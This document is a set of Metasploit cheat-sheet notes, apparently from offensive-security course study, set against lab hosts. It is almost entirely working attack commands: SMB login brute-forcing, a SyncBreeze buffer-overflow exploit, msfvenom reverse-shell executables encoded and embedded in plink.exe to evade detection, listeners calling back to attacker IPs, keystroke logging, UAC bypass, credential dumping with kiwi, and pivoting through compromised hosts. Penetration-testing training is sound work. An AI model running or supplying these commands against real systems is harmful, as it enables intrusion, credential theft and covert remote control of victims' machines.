#### Metasploit Framework

```
sudo systemctl start postgresql

sudo systemctl enable postgresql

sudo msfdb init

sudo apt update; sudo apt install metasploit-framework

sudo msfconsole -q

```

##### MSF syntax

```
show -h

use auxiliary/scanner/portscan/tcp

back

use auxiliary/scanner/portscan/tcp

use auxiliary/scanner/portscan/syn

previous

show options

set RHOSTS 192.168.119.175

run

```
##### Metasploit Database Access

```
services

services -h

db_nmap

db_nmap 192.168.119.175 -A -Pn

hosts

services -p 445

workspace

workspace test

workspace -a tada

workspace -d tada

```

##### Auxiliary

```
show auxiliary

search -h

search type:auxiliary name:smb

use scanner/smb/smb2

info

run

services -p 445 --rhosts

use scanner/smb/smb_login

options

set SMBDomain corp.com

set SMBUser Offsec

set SMBPass ABCDEFG123!

setg RHOSTS 10.11.0.22

set THREADS 10

set THREADS 10

run

set SMBPass Qwerty09!

run

creds

set USERPASS_FILE /home/kali/users.txt # file containing users and passwords separated by space

run

use scanner/rdp/rdp_scanner

show options

set RHOSTS 10.11.0.22

run

```

##### Exploit Modules

```
search syncbreeze

info exploit/windows/http/syncbreeze_bof

use exploit/windows/http/syncbreeze_bof

show payloads

set payload windows/shell_reverse_tcp

show options

set LHOST 192.168.175.10

set RHOST 192.168.119.175

check

exploit

```

##### Metasploit Payloads

###### Staged vs Non-Staged Payloads

```
windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell 
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)

```

###### Meterpreter Payloads

```

search meterpreter type:payload

set payload windows/meterpreter/reverse_http

set LHOST 192.168.119.175

show options

exploit


```

###### Experimenting with Meterpreter

```
meterpreter> help

sysinfo

getuid

upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec

download c:\\Windows\\system32\\calc.exe /tmp/calc.exe

shell

ftp 127.0.0.1

shell

exit

```

There are other payloads that have use cases in specific situations like vncinject/reverse_http, which creates a reverse VNC713 graphical connection or php/reverse_php, which is a reverse shell written entirely in PHP that can be used to exploit a PHP web application. More exotic payloads also exist like mainframe/reverse_shell_jcl, which is a reverse shellcode for a Z/OS mainframe.


###### Executable Payloads - msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe

file shell_reverse.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.119.175 LPORT=4444 -f elf -o shell_reverse_staged

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.175 LPORT=4444 -f elf -o shell_reverse_non-staged

```

The process in msfconsole

```
msf5 > use payload/windows/shell_reverse_tcp

msf5 payload(windows/shell_reverse_tcp) > set LHOST 10.11.0.4
LHOST => 10.11.0.4

msf5 payload(windows/shell_reverse_tcp) > set LPORT 443 LPORT => 443

msf5 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9 - x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
[*] Writing 311296 bytes to shell_reverse_msf_encoded_embedded.exe...

```
###### Metasploit Exploit Multi Handler

```

use multi/handler

set payload windows/meterpreter/reverse_https

show options

set LHOST 192.168.119.175

set LPORT 443

exploit

exploit -j

jobs

jobs -i 0

kill 0

```

###### Client Side Attacks

```

msfvenom -l formats

msf5> search flash

```

Advanced features - 

Encoding

```
msf5 exploit(multi/handler) > show advanced

set EnableStageEncoding true

set StageEncoder x86/shikata_ga_nai

exploit -j

```
AutoRunScript

```
msf5 exploit(multi/handler) > set AutoRunScript windows/gather/enum_logged_on_users

exploit -j

```

```
meterpreter > background

msf5 exploit(multi/handler) > sessions -l

session -i 5

meterpreter > transport list

transport add -t reverse_tcp -l 10.11.0.4 -p 5555

transport list


```

we can use Meterpreter payload transports716 to switch protocols after our initial compromise. We can list the currently available transports for the meterpreter connection with transport list.


Before we can take advantage of the new transport, we must set up a listener to accept the connection. We’ll do this by once again selecting the multi/handler module and specifying the same parameters we selected earlier.
With the handler configured, we can return to the meterpreter session and run transport next to change to the newly-created transport mode. This will create a new session and close down the old one.

```
meterpreter > background
[*] Backgrounding session 5...

msf5 exploit(windows/http/syncbreeze_bof) > use multi/handler

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST 10.11.0.4 LHOST => 10.11.0.4

msf5 exploit(multi/handler) > set LPORT 5555 LPORT => 5555

msf5 exploit(multi/handler) > exploit -j [*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.11.0.4:5555

msf5 exploit(multi/handler) > sessions -i 5 [*] Starting interaction with 5...
meterpreter > transport next
[*] Changing to next transport ...

[*] Sending stage (179779 bytes) to 10.11.0.22
[+] Successfully changed to the next transport, killing current session.

[*] 10.11.0.22 - Meterpreter session 5 closed. Reason: User exit

msf5 exploit(multi/handler) >
[*] Meterpreter session 6 opened (10.11.0.4:5555 -> 10.11.0.22:50357)

msf5 exploit(multi/handler) > sessions -i 6 
[*] Starting interaction with 6...

meterpreter >

```

##### Post Exploitation

```
meterpreter > screenshot

meterpreter > keyscan_start 
Starting the keystroke sniffer ...

meterpreter > keyscan_dump 
Dumping captured keystrokes... ipconfig<CR>
whoami<CR>

meterpreter > keyscan_stop 
Stopping the keystroke sniffer... 
meterpreter >

```
Migrating process

```
meterpreter > ps

Process List
============
PID PPID Name
--- ---- ----
...
3116 904 WmiPrvSE.exe
3164 3568 shell_reverse_msf_encoded.exe x86 1 corp\offsec C:\Users\Offsec.corp\Desktop\shell_reverse_msf_encoded.exe
3224 808 msdtc.exe
3360 1156 sihost.exe C:\Windows\System32\sihost.exe 3544 808 syncbrs.exe
3568 1960 explorer.exe C:\Windows\explorer.exe
3820 808 svchost.exe C:\Windows\System32\svchost.exe ...

meterpreter > migrate 3568

```

Post exploitation modules

```

msf5 > use exploit/windows/local/bypassuac_injection_winsxs
msf5 exploit(windows/local/bypassuac_injection_winsxs) > show options

msf5 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 10 SESSION => 10
msf5 exploit(windows/local/bypassuac_injection_winsxs) > exploit

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > help powershell

meterpreter > powershell_execute "$PSVersionTable.PSVersion"


meterpreter > load kiwi Loading extension kiwi...
Success.
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > creds_msv

```

Pivoting with Metasploit Framework

```

ipconfig

msf5 > route add 192.168.1.0/24 11 
[*] Route added
msf5 > route print

msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
RHOSTS => 192.168.1.110
msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389 
PORTS => 445,3389
msf5 auxiliary(scanner/portscan/tcp) > run


msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec_psh) > set SMBDomain corp
SMBDomain => corp
msf5 exploit(windows/smb/psexec_psh) > set SMBUser jeff_admin 
SMBUser => jeff_admin
msf5 exploit(windows/smb/psexec_psh) > set SMBPass Qwerty09! 
SMBPass => Qwerty09!
msf5 exploit(windows/smb/psexec_psh) > set RHOSTS 192.168.1.110 
RHOSTS => 192.168.1.110
msf5 exploit(windows/smb/psexec_psh) > set payload windows/meterpreter/bind_tcp 
payload => windows/meterpreter/bind_tcp
msf5 exploit(windows/smb/psexec_psh) > set LHOST 192.168.1.110 
LHOST => 192.168.1.110
msf5 exploit(windows/smb/psexec_psh) > set LPORT 444 
LPORT => 444
msf5 exploit(windows/smb/psexec_psh) > exploit



msf5 exploit(multi/handler) > use multi/manage/autoroute 

msf5 post(multi/manage/autoroute) > show options

msf5 post(multi/manage/autoroute) > sessions -l

msf5 post(multi/manage/autoroute) > set session 4 
session => 4
msf5 post(multi/manage/autoroute) > exploit


msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a 
msf5 auxiliary(server/socks4a) > show options

msf5 auxiliary(server/socks4a) > set SRVHOST 127.0.0.1 
SRVHOST => 127.0.0.1
msf5 auxiliary(server/socks4a) > exploit -j


kali@kali:~$ sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf

kali@kali:~$ sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf

portfwd -h 

portfwd add -l 3389 -p 3389 -r 192.168.1.110

rdesktop 127.0.0.1

```
##### Metasploit automation

setup.rc

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https 
set LHOST 192.168.119.175
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false 
exploit -j -z
 
```

starting metasploit using resource script

```

sudo msfconsole -r setup.rc

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.175 LPORT=443 -f exe -o met.exe

```
